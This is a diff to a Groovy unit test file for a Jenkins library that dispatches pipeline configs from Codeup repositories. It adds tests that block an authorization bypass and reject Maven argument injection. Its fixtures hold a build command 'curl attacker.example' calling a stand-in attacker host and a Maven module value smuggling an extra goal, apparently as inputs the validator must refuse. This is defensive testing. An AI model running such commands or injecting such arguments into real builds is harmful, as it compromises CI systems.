@@ -316,7 +316,7 @@ class DispatchCodeupRepositoriesVarTest {
                 [[id: '1', name: 'repo-a']],
                 ['1': [[name: 'Jenkinsfile.groovy', path: 'Jenkinsfile.groovy', type: 'blob']]],
                 ['1:Jenkinsfile.groovy': """
-                        def customConfig = [DEPLOY_PIPELINE: [stepsBuildNpm: [buildCMD: 'curl attacker.example']]]
+                        def customConfig = [SHARE_PARAM: [appName: 'repo-a'], DEPLOY_PIPELINE: [stepsBuildNpm: [buildCMD: 'curl attacker.example']]]
                         deployWeb(customConfig)
                         """.stripIndent()]
         )
@@ -342,7 +342,7 @@ class DispatchCodeupRepositoriesVarTest {
                 [[id: '1', name: 'repo-a']],
                 ['1': [[name: 'Jenkinsfile.groovy', path: 'Jenkinsfile.groovy', type: 'blob']]],
                 ['1:Jenkinsfile.groovy': """
-                        def customConfig = [DEPLOY_PIPELINE: [stepsBuildNpm: [buildCMD: 'npm run build']]]
+                        def customConfig = [SHARE_PARAM: [appName: 'repo-a'], DEPLOY_PIPELINE: [stepsBuildNpm: [buildCMD: 'npm run build']]]
                         deployWeb(customConfig)
                         """.stripIndent()]
         )
@@ -364,6 +364,45 @@ class DispatchCodeupRepositoriesVarTest {
         assertTrue(result.rejected.isEmpty())
         assertTrue(result.failed.isEmpty())
         assertEquals('npm run build', dispatchedConfigs[0].DEPLOY_PIPELINE.stepsBuildNpm.buildCMD)
+    }
+
+    @Test
+    void dispatchCodeupRepositoriesCannotBypassRemoteCommandAuthorization() {
+        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
+        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))
+
+        IllegalArgumentException error = assertThrows(IllegalArgumentException.class) {
+            script.invokeMethod('call', [[
+                    token: 'pt-token', organizationId: 'org-id', allowAllRepositories: true,
+                    allowUnsafeCommandFields: true
+            ]] as Object[])
+        }
+
+        assertTrue(error.message.contains('已禁用'))
+    }
+
+    @Test
+    void dispatchCodeupRepositoriesRejectsMavenArgumentInjection() {
+        stubCodeupApi(
+                [[id: '1', name: 'repo-a']],
+                ['1': [[name: 'Jenkinsfile.groovy', path: 'Jenkinsfile.groovy', type: 'blob']]],
+                ['1:Jenkinsfile.groovy': """
+                        def customConfig = [
+                            SHARE_PARAM: [appName: 'repo-a'],
+                            DEPLOY_PIPELINE: [stepsBuild: [stepsBuildMaven: [subModule: 'app help:effective-pom']]]
+                        ]
+                        deployJavaWeb(customConfig)
+                        """.stripIndent()]
+        )
+        Script script = new GroovyShell(CodeupApi.class.classLoader)
+                .parse(new File('vars/dispatchCodeupRepositories.groovy'))
+
+        Map result = script.invokeMethod('call', [[
+                token: 'pt-token', organizationId: 'org-id', allowedRepositoryNames: ['repo-a'], dryRun: true
+        ]] as Object[]) as Map
+
+        assertEquals(1, result.rejected.size())
+        assertTrue(result.rejected[0].reason.contains('Maven模块相对路径'))
     }
 
     @Test
@@ -422,8 +461,9 @@ class DispatchCodeupRepositoriesVarTest {
             }
             return filesByRepositoryId[repositoryId] ?: []
         }
-        emc.getFileContent = { String domain, String token, String repositoryId, String filePath, String ref, String organizationId ->
-            return contentsByRepositoryAndPath["${repositoryId}:${filePath}"]
+        emc.getFileRecord = { String domain, String token, String repositoryId, String filePath, String ref, String organizationId ->
+            String content = contentsByRepositoryAndPath["${repositoryId}:${filePath}"]
+            return content == null ? [exists: false] : [exists: true, content: content, revision: "commit-${repositoryId}"]
         }
         emc.initialize()
         GroovySystem.metaClassRegistry.setMetaClass(CodeupApi, emc)
